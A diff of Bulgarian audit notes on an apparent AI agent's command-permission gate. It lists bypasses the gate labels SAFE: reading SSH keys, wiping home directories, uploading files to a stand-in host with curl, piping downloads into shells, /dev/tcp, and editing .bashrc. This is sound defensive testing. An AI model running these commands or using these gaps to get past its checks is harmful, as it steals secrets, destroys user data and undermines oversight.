@@ -40,14 +40,13 @@
 
 **Отворено от този кръг** (възпроизведено, непоправено — по реда на тежестта):
 - Портата: четене на тайни през `bash -c 'cat ~/.ss{h,x}/id_rs{a,b}'` (скоби), `cd; cat .s*/*`,
-  `grep -rh X ~`, `find ~ -exec cat {} +` — SAFE; `echo … >> ~/.bashrc|.gitconfig` — SAFE;
-  `git commit -m '… rm -rf / …'` — BLOCKED. ~~Целият дом без rm (`mv ~`, `find ~ | xargs rm`,
-  `rsync --delete ~/`, `rm -rf ~/.*`, `chmod 777 -R /`, `cd $HOME && rm -rf *`), `git checkout
-  -f`/`git restore файл`, `[IO.Directory]::Delete`, качване (`curl -sT`, localhost в чужд
-  хост, `rsync f u@h:`, `/dev/tcp/`), `curl … | zsh|python3`, `bash <(curl …)`~~ — осми кръг,
-  `tests/test_audit_2026_11_10_gate_round8.py` (86; 54 падат без поправката). Нарочно: домът
-  при `chmod/chown -R` само пита (отказ не се одобрява); `| python3 -m …`/`-c` е данни — SAFE.
-  Не е покрито: `cd / && chmod -R 777 .`, `curl … | tee f | bash`, `find ~ -exec mv`.
+  `grep -rh X ~`, `find ~ -exec cat {} +` — SAFE; целият дом: `mv ~ /tmp/x`, `find ~ -exec
+  truncate -s 0 {} +`, `find ~ -print0 | xargs -0 rm` — SAFE, а `rsync -a --delete /var/empty/
+  ~/`, `rm -rf ~/.*`, `chmod 777 -R /`, `cd $HOME && rm -rf *` — само питат; `git checkout -f`,
+  `git restore файл` — SAFE; качване: `curl -d @f https://localhost.x.example/` (изключението
+  за localhost гледа целия ред), `curl -sT`, `rsync f u@h:`, `curl … | zsh|python3`,
+  `bash <(curl …)`, `/dev/tcp/` — SAFE; `powershell [IO.Directory]::Delete($HOME,$true)`;
+  `echo … >> ~/.bashrc|.gitconfig` — SAFE; `git commit -m '… rm -rf / …'` — BLOCKED.
 - /permissions приема `pipenv *`, `bundle *`, `mise *`, `parallel *` (покриват всяка команда);
   `npm *` покрива `npm explore pkg -- rm -rf build`.
 - /undo: EDIT + `chmod +x` в същия ход — правата остават; команда, сменила файл с връзка —
